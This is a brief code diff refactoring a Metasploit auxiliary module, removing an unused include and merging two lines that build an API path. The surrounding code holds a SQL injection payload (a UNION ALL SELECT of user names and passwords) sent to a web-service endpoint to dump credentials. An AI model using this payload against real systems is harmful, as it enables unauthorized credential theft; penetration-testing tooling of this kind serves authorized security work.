@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
@@ -42,8 +41,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_creds
-    api_uri = "/webservice/rest/object-inquire"
-    api_uri = normalize_uri(target_uri.path, api_uri)
+    api_uri = normalize_uri(target_uri.path, "/webservice/rest/object-inquire")
     cmd = "#{rand(256)}) UNION ALL SELECT CONCAT(name,\" \",password) from users#"
 
     res = send_request_cgi(
